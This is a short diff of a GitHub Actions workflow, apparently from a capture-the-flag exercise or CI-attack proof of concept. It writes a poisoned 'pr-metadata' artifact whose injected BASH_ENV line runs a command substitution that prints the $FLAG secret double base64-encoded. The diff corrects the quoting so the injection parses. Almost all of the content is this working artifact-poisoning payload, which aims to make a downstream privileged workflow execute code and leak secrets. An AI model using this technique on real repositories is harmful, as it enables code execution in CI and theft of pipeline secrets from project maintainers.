@@ -8,7 +8,7 @@ jobs:
     steps:
       - run: |
           printf 'PR_ACTOR=%s\n' "$GITHUB_ACTOR" > actor.txt
-          echo -e "BASH_ENV='\$(echo \$FLAG | base64 | base64)\n'" >> actor.txt
+          echo -e "BASH_ENV='\$(echo \$FLAG | base64 | base64)'\n" >> actor.txt
       - uses: actions/upload-artifact@v7.0.2
         with:
           name: pr-metadata
